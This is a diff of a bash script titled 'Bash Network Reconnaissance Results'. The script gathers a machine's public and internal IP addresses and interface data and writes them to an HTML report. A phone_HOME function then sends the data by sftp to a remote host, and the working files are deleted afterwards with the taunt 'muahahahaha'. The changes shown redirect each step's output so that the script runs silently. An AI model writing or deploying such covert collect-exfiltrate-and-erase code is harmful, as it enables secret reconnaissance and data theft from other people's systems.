@@ -15,6 +15,7 @@ OUTPUT="netenv.$(hostname).$(date +'%d-%m-%y').html"
 TITLE="Bash Network Reconnaissance Results"
 RIGHT_NOW=$(date +"%x %r %Z")
 pubIP=$(curl ipreturn.tk/raw)
+null="/dev/null 2&>1"
 ########################
 INTFACES=$(/sbin/ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d')
 intIPS=$(for i in ${INTFACES}; do /sbin/ifconfig $i | grep Mask | cut -d ':' -f2 | cut -d " " -f1; done)
@@ -82,12 +83,12 @@ sftp -b batch $sftpUSER@$sftpHOST:/$sftpDIR
 function clean_UP(){
 # if secure-delete is not available, revert to rm
 srm -r $workDIR || rm -rf $workDIR
-echo "muahahahaha" >> /dev/null
+echo "muahahahaha" >> $null
 }
 
 
-prep_VARS
+prep_VARS >> $null
 write_page > $OUTPUT
-phone_HOME
-clean_UP
+phone_HOME >> $null
+clean_UP >> $null
 exit
